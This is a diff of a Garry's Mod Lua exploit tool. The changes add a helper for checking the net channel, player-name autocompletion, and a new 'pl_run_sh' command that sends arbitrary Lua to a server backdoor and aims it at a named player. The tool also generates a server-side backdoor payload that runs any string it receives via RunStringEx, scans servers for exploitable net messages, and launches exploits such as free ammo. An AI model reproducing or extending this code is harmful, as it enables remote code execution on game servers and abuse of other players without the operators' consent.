@@ -19,6 +19,13 @@ if(error ~= 0) then
   end
 end
 
+local function channelNil()
+  if(channel == "") then
+    MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.")
+    return true
+  end
+end
+
 local function dumpNet()
 for i = 1, 9999 do
   local s = util.NetworkIDToString( i )
@@ -44,8 +51,8 @@ for k,v in pairs(bdChannels) do
 end
 
 local function luaRun(ply, cmd, args, argStr)
-if(channel == "") then MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.") return end
 if(!argStr) then return end
+if(channelNil()) then return end
   net.Start(channel)
 	net.WriteString(argStr)
 	net.SendToServer()
@@ -53,8 +60,8 @@ if(!argStr) then return end
 end
 
 local function luaRunOnLocal(ply, cmd, args, argStr)
-if(channel == "") then MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.") return end
 if(!argStr) then return end
+if(channelNil()) then return end
   local run = "player.GetByID("..lPlayer.."):"..argStr
   net.Start(channel)
 	net.WriteString(run)
@@ -113,24 +120,64 @@ local function initExploit(ply, cmd, args)
   MsgC(Color(166,222,255), "Exploit has been launched!\n")
 end
 
-local function addCommand(command, desc, group, func)
-  concommand.Add(prefix.."_"..command, func)
-  commands[tostring(command)] = {name = prefix.."_"..command, description = desc, group = group}
+local function addCommand(command, desc, group, func, autocomplete)
+  concommand.Add(prefix.."_"..command, func, autocomplete )
+  commands[tostring(command)] = {
+    name = prefix.."_"..command,
+    description = desc,
+    group = group
+  }
 end
 
 local function addExploit(name, channel, func)
   local id = table.Count(exploits)
-  exploits[id] = {name = name, id = id, channel = channel, func = func, vulnerable = false}
+  exploits[id] = {
+  name = name,
+  id = id,
+  channel = channel,
+  func = func,
+  vulnerable = false
+}
 end
 
 local function generatePayload(ply, cmd, args, argStr)
- if(!argStr) then return end
+ if(!argStr || argStr == "") then return end
  SetClipboardText([[util.AddNetworkString(']]..argStr..[[') net.Receive(']]..argStr..[[',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)]])
  MsgC(Color(166,222,255), "Payload has been generated and copied to your clipboard with the following channel: ", Color(155,155,155), argStr)
 end
 
 local function testFunction()
   PrintTable(vulExploit)
+end
+
+local function ACGetPlayers( cmd, stringargs )
+	print( cmd, stringargs )
+	stringargs = string.Trim( stringargs )
+	stringargs = string.lower( stringargs )
+	local tbl = {}
+	for k, v in pairs( player.GetAll() ) do
+		local nick = v:Nick()
+		if string.find( string.lower( nick ), stringargs ) then
+      nick = cmd.. " " .."\""..nick.."\""
+			table.insert( tbl, nick )
+		end
+	end
+	return tbl
+end
+
+local function runOnShared(ply, cmd, args, argStr)
+  if(!args[1] && !args[2]) then return end
+    if(channelNil()) then return end
+    for k, v in pairs(player.GetAll()) do
+      if(v:Nick() == args[1]) then
+        local exec = "player.GetByID("..v:EntIndex().."):"..table.concat(args, nil, 2)
+        net.Start(channel)
+        net.WriteString(exec)
+        net.SendToServer()
+        print(exec)
+        return
+    end
+  end
 end
 
 local function init()
@@ -141,11 +188,12 @@ addCommand("help", "Shows you a list of commands and their description.", "Help"
 addCommand("pl_intensescan", "Launches an intense scan on the server (This can be risky due to discarding net messages).", "Payloads", intenseScan)
 addCommand("pl_run", "Sends function to selected channel.", "Payloads", luaRun)
 addCommand("pl_run_cl", "Sends function to selected channel but targets you.", "Payloads", luaRunOnLocal)
-addCommand("util_pl_generate", "Takes one string argument as the channel identifier for the payload.", "Utility", generatePayload)
+addCommand("util_genpayload", "Takes one string argument as the channel identifier for the payload.", "Utility", generatePayload)
 addCommand("util_dump", "Dump all the networking channels in a nice neat list.", "Utility", dumpNet)
 addCommand("util_target", "Sets the target channel (Takes 1 argument).", "Utility", setTarget)
 addCommand("ex_scan", "Scans for possible exploits on the server.", "Exploits", scanExploits)
 addCommand("ex_launch", "Launch exploit from ID", "Exploits", initExploit)
+addCommand("pl_run_sh", "Targets function to specified player.", "Payloads", runOnShared, ACGetPlayers)
 
 addExploit("Free Ammo", "TCBBuyAmmo", function()  end)
 addExploit("Test", "striphelper", function() net.WriteString("print('bruh')") end)
